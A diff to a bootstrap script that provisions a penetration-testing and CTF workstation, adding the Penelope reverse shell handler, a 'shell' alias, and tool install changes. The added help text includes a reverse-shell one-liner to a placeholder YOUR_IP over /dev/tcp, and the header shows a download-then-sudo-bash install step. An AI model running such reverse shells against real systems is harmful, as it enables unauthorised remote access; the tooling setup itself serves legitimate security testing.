@@ -11,6 +11,7 @@
 # wget -O /tmp/bootstrap.sh https://raw.githubusercontent.com/Jamie-loring/<YOUR_REPO>/main/bootstrap.sh
 # tr -cd '[:print:]\n\t' < /tmp/bootstrap.sh > /tmp/bootstrap_clean.sh
 # sudo bash /tmp/bootstrap_clean.sh
+# updated 10/27/2025
 # ---------------------------
 
 set -e
@@ -186,26 +187,27 @@ phase4_tools_setup() {
   # Core HTB/CTF tools (APT)
   log_progress "Installing core CTF/HTB utilities, pivoting, and power user replacements..."
   DEBIAN_FRONTEND=noninteractive apt install -y \
-    # Networking/Pivoting
     socat rlwrap xfreerdp upx proxychains4 \
-    # Modern CLI Replacements
     zoxide eza btop httpie yq \
-    # Wireless/Web
     aircrack-ng bluez bluelog hcitool wpscan \
-    # Forensics/Stego/RE
     steghide zsteg binwalk foremost exiftool p7zip-full radare2 \
-    # Cracking/Exploitation
     sqlmap hashcat john theharvester cewl gdb || true
  
   # Other essential Python tools with pip
   log_progress "Installing essential Python pentesting tools, including hash identification..."
   pip3 install --break-system-packages \
     hashid \
-    RsaCtfTool featherduster \
+    featherduster \
     bloodhound bloodyAD mitm6 responder certipy-ad coercer \
     pypykatz lsassy enum4linux-ng dnsrecon git-dumper \
-    penelope-shell roadrecon manspider mitmproxy pwntools \
+    roadrecon manspider mitmproxy pwntools \
     ROPgadget truffleHog || true
+ 
+  # RsaCtfTool requires specific Python version - install from repo if needed
+  if [ ! -d "$USER_HOME/tools/repos/RsaCtfTool" ]; then
+    log_progress "Installing RsaCtfTool from GitHub..."
+    sudo -u jamie git clone https://github.com/RsaCtfTool/RsaCtfTool.git $USER_HOME/tools/repos/RsaCtfTool || log_warn "RsaCtfTool clone failed"
+  fi
  
   # Java deserialization (ysoserial)
   log_progress "Installing ysoserial (Java deserialization)..."
@@ -220,17 +222,6 @@ phase4_tools_setup() {
 java -jar ~/tools/ysoserial.jar "$@"
 YSOSERIAL_EOF
       chmod +x /usr/local/bin/ysoserial
-    fi
-  fi
- 
-  # Install pwndbg (better GDB)
-  if [ ! -d "$USER_HOME/tools/repos/pwndbg" ]; then
-    log_progress "Installing pwndbg (enhanced GDB)..."
-    sudo -u jamie git clone https://github.com/pwndbg/pwndbg $USER_HOME/tools/repos/pwndbg || true
-    if [ -d "$USER_HOME/tools/repos/pwndbg" ]; then
-      cd $USER_HOME/tools/repos/pwndbg
-      sudo -u jamie ./setup.sh || log_warn "pwndbg setup failed (this is optional)"
-      cd - > /dev/null
     fi
   fi
  
@@ -252,8 +243,7 @@ YSOSERIAL_EOF
   go install -v github.com/OJ/gobuster/v3@latest || true
   go install -v github.com/ropnop/kerbrute@latest || true
   go install -v github.com/jpillora/chisel@latest || true
-  go install -v github.com/gitleaks/gitleaks/v8@latest || true
-  go install -v github.com/michenriksen/gitrob@latest || true
+  go install -v github.com/zricethezav/gitleaks/v8@latest || true
  
   # Fallback pivoting tool
   log_progress "Installing sshuttle (VPN over SSH)..."
@@ -295,6 +285,9 @@ YSOSERIAL_EOF
   if [ ! -d "$USER_HOME/tools/repos/GitTools" ]; then
     sudo -u jamie git clone https://github.com/internetwache/GitTools.git $USER_HOME/tools/repos/GitTools
   fi
+  if [ ! -d "$USER_HOME/tools/repos/penelope" ]; then
+    sudo -u jamie git clone https://github.com/brightio/penelope.git $USER_HOME/tools/repos/penelope
+  fi
  
   # SecLists wordlists
   log_progress "Downloading SecLists (this is large, ~700MB)..."
@@ -314,6 +307,7 @@ YSOSERIAL_EOF
   sudo -u jamie ln -sf /usr/share/wordlists/rockyou.txt $USER_HOME/tools/wordlists/rockyou.txt 2>/dev/null || true
   sudo -u jamie ln -sf $USER_HOME/tools/repos/PEASS-ng/linPEAS/linpeas.sh $USER_HOME/linpeas.sh 2>/dev/null || true
   sudo -u jamie ln -sf $USER_HOME/tools/repos/PEASS-ng/winPEAS/winPEASx64.exe $USER_HOME/winpeas.exe 2>/dev/null || true
+  sudo -u jamie ln -sf $USER_HOME/tools/repos/penelope/penelope.py $USER_HOME/penelope.py 2>/dev/null || true
  
   log_info "Phase 4 complete"
   log_progress "Phase 4/8:  Complete"
@@ -388,6 +382,7 @@ alias ports='netstat -tulanp'
 alias listening='lsof -i -P -n | grep LISTEN'
 alias hash='hashid' # Primary hash identifier
 alias http='httpie' # Modern cURL replacement
+alias shell='python3 ~/penelope.py' # Penelope reverse shell handler (preferred over nc)
 
 # Aliases - Tool shortcuts
 alias nxc='netexec' # Short form for NetExec
@@ -704,6 +699,34 @@ xfreerdp
  RDP client for connecting to Windows systems
 
 
+POST-EXPLOITATION & REVERSE SHELLS
+
+
+Penelope (Alias: shell) ⭐ RECOMMENDED
+ Advanced shell handler with auto-upgrade to PTY, file transfer, and port forwarding
+ Usage: shell 4444
+ Location: ~/penelope.py
+ Features:
+  - Auto-upgrade shells to PTY
+  - Tab completion & command history
+  - Upload/download files
+  - Multiple session management
+  - Port forwarding
+  - Session logging
+ Example target command:
+  bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
+
+rlwrap nc (Alias: rl)
+ Netcat with readline support (history/editing)
+ Usage: rl -lvnp 4444
+ Quick and simple for basic shells
+
+netcat (nc)
+ Classic TCP/UDP swiss army knife
+ Usage: nc -lvnp 4444
+ Minimal but reliable
+
+
 PASSWORD CRACKING & HASH ID
 
 
@@ -1003,8 +1026,7 @@ go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest
 go install -v github.com/ffuf/ffuf@latest
 go install -v github.com/OJ/gobuster/v3@latest
 go install -v github.com/jpillora/chisel@latest
-go install -v github.com/gitleaks/gitleaks/v8@latest
-go install -v github.com/michenriksen/gitrob@latest
+go install -v github.com/zricethezav/gitleaks/v8@latest
 go install -v github.com/ropnop/kerbrute@latest || true
 
 echo "[+] Updating Ruby tools (one_gadget, haiti)..."
@@ -1028,13 +1050,6 @@ done
 echo "[+] Updating SecLists..."
 cd ~/tools/wordlists/SecLists
 git pull
-
-echo "[+] Updating pwndbg..."
-if [ -d ~/tools/repos/pwndbg ]; then
-  cd ~/tools/repos/pwndbg
-  git pull
-  cd -
-fi
 
 echo "[+] All tools updated!"
 EOF
@@ -1334,6 +1349,7 @@ Next steps:
 Useful commands:
  - newengagement <name>  : Create new engagement folder
  - quickscan <target>   : Quick nmap scan
+ - shell <port>      : Start Penelope reverse shell handler (e.g., shell 4444)
  - z <keyword>      : Jump to any directory instantly (zoxide)
  - ll           : Modern file listing (eza)
  - top          : System monitor (btop)
